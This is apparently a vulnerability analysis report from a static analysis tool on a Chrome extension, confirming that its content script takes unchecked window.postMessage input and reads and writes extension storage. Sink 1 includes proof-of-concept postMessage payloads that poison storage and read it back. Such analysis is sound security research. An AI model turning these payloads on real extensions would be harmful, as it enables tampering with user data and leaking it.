# CoCo Analysis: peiajekggpiihnhphljoikpjeaahkdcn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 6

---

## Sink 1: cs_window_eventListener_message → chrome_storage_sync_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/peiajekggpiihnhphljoikpjeaahkdcn/opgen_generated_files/cs_0.js
Line 495    window.addEventListener("message", function (event) {
Line 496      var data = event.data;
Line 504        newData["settings:" + data.id][data.key] = data.value;
```

**Code:**

```javascript
// Content script cs_0.js - Lines 495-518
window.addEventListener("message", function (event) {
  var data = event.data; // ← attacker-controlled from webpage
  switch (data.type) {
    case "xchat:updateSetting":
      chrome.storage.sync.get("settings:" + data.id, function (items) {
        var newData = items;
        if (newData["settings:" + data.id] === undefined) {
          newData["settings:" + data.id] = {};
        }
        newData["settings:" + data.id][data.key] = data.value; // ← attacker-controlled
        chrome.storage.sync.set(newData) // ← Storage write
      });
      break;
    case "xchat:registerSettingsManager":
      managers.push(data.id);
      chrome.storage.sync.get("settings:" + data.id, function (items) {
        window.postMessage({
          type: "xchat:settingsUpdated:" + data.id,
          settings: {
            old: {},
            new: items["settings:" + data.id] // ← Storage read sent back to webpage
          }
        }, "*"); // ← Sends back to attacker
      });
      break;
    case "xchat:cache:get":
      chrome.storage.local.get("cache", function (items) {
        window.postMessage({
          type: "xchat:cache:receive:" + data.id,
          data: (items["cache"] || {})[data.id] // ← Storage read sent back to webpage
        }, "*"); // ← Sends back to attacker
      });
      break;
    case "xchat:cache:set":
      (function cacheSet() {
        if (!setBusy) {
          setBusy = true;
          chrome.storage.local.get("cache", function (items) {
            var cache = items["cache"] || {};
            cache[data.id] = data.data; // ← attacker-controlled
            chrome.storage.local.set({cache: cache}, function () { // ← Storage write
              window.postMessage({
                type: "xchat:cache:set:" + data.id
              }, "*");
              setBusy = false;
            });
          });
        } else {
          setTimeout(function () {
            cacheSet();
          }, 10);
        }
      })();
      break;
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from webpage (beam.pro domain)

**Attack:**

```javascript
// From a page on beam.pro (now mixer.com):

// 1. Write arbitrary data to storage
window.postMessage({
  type: "xchat:updateSetting",
  id: "malicious",
  key: "injected",
  value: "attacker-controlled-data"
}, "*");

// 2. Write to cache storage
window.postMessage({
  type: "xchat:cache:set",
  id: "exploit",
  data: {
    sensitive: "malicious payload",
    credentials: "stolen data"
  }
}, "*");

// 3. Read back all settings for a given ID
window.postMessage({
  type: "xchat:registerSettingsManager",
  id: "malicious"
}, "*");

// Listen for the response
window.addEventListener("message", function(event) {
  if (event.data.type === "xchat:settingsUpdated:malicious") {
    console.log("Retrieved settings:", event.data.settings.new);
  }
});

// 4. Read back cache data
window.postMessage({
  type: "xchat:cache:get",
  id: "exploit"
}, "*");

// Listen for the response
window.addEventListener("message", function(event) {
  if (event.data.type === "xchat:cache:receive:exploit") {
    console.log("Retrieved cache:", event.data.data);
  }
});
```

**Impact:** Complete storage exploitation with information disclosure. An attacker on beam.pro can both poison the extension's chrome.storage.sync and chrome.storage.local with arbitrary data, and retrieve any stored data back via window.postMessage. This allows the attacker to manipulate extension state and exfiltrate sensitive information stored by the extension, including user settings and cached data.

---

## Sink 2: storage_sync_get_source → window_postMessage_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/peiajekggpiihnhphljoikpjeaahkdcn/opgen_generated_files/cs_0.js
Line 395    'key': 'value'
```

**Classification:** TRUE POSITIVE (Same as Sink 1)

**Reason:** This is part of the same exploitation chain documented in Sink 1, where storage.sync.get retrieves data and sends it back to the attacker via window.postMessage (lines 510-517).

---

## Sink 3-6: cs_window_eventListener_message → chrome_storage_local_set_sink

**Classification:** TRUE POSITIVE (Same as Sink 1)

**Reason:** These are duplicate detections of the cache storage write operation (lines 534-535) documented in Sink 1. Multiple trace paths converge on the same vulnerable code.
